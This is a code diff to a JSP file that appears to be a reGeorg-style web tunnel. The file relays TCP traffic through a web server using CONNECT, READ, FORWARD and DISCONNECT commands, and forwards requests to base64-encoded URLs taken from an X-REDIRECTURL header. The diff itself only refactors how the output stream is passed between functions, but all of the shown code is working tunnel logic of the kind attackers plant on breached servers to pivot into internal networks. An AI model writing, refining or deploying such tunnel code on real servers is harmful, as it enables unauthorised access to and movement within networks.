@@ -80,14 +80,13 @@
         return buf.toByteArray();
     }
 
-    void puts(HttpServletResponse r, String str) throws Exception {
+    void puts(ServletOutputStream so, String str) throws Exception {
         byte[] bs = str.getBytes("ISO8859-1");
-        ServletOutputStream so = r.getOutputStream();
         so.write(bs, 0, bs.length);
         so.close();
     }
 
-    private static void redirectRequest(String urlheader, String url, HttpServletRequest request, HttpServletResponse response) throws Exception {
+    private static void redirectRequest(String urlheader, String url, HttpServletRequest request, HttpServletResponse response, ServletOutputStream so) throws Exception {
         response.reset();
         String method = request.getMethod();
         URL u = new URL(url);
@@ -147,15 +146,14 @@
             }
         }
 
-        ServletOutputStream outputStream = response.getOutputStream();
         response.setStatus(conn.getResponseCode());
 
         while ((i = hin.read(buffer)) != -1) {
-            outputStream.write(buffer, 0, i);
+            so.write(buffer, 0, i);
         }
 
-        outputStream.flush();
-        outputStream.close();
+        so.flush();
+        so.close();
     }
 
     static String headerkey(String str) throws Exception {
@@ -184,11 +182,13 @@
     }
 %>
 <%
+    ServletOutputStream so = response.getOutputStream();
+
     String rUrl = request.getHeader("X-REDIRECTURL");
     if (rUrl != null) {
         rUrl = new String(b64de(rUrl));
         if (!islocal(rUrl)){
-            redirectRequest("X-REDIRECTURL", rUrl, request, response);
+            redirectRequest("X-REDIRECTURL", rUrl, request, response, so);
             if ( true ) return; // exit
         }
     }
@@ -214,7 +214,7 @@
                 response.setHeader("X-ERROR", "Failed connecting to target");
                 response.setHeader("X-STATUS", "FAIL");
             }
-            puts(response, "");
+            puts(so, "");
         } else if (cmd.compareTo("DISCONNECT") == 0) {
             SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
             try{
@@ -222,13 +222,12 @@
             } catch (Exception e) {
             }
             session.removeAttribute(mark);
-            puts(response, "");
+            puts(so, "");
         } else if (cmd.compareTo("READ") == 0){
             SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
             try{
                 ByteBuffer buf = ByteBuffer.allocate(513);
                 int bytesRead = socketChannel.read(buf);
-                ServletOutputStream so = response.getOutputStream();
                 while (bytesRead > 0){
                     byte[] data = new byte[bytesRead];
                     System.arraycopy(buf.array(), 0, data, 0, bytesRead);
@@ -242,7 +241,7 @@
 
             } catch (Exception e) {
                 response.setHeader("X-STATUS", "FAIL");
-                puts(response, "");
+                puts(so, "");
             }
 
         } else if (cmd.compareTo("FORWARD") == 0){
@@ -269,9 +268,9 @@
                 response.setHeader("X-STATUS", "FAIL");
                 socketChannel.socket().close();
             }
-            puts(response, "");
+            puts(so, "");
         }
     } else {
-        puts(response, "Georg says, 'All seems fine'");
+        puts(so, "Georg says, 'All seems fine'");
     }
 %>
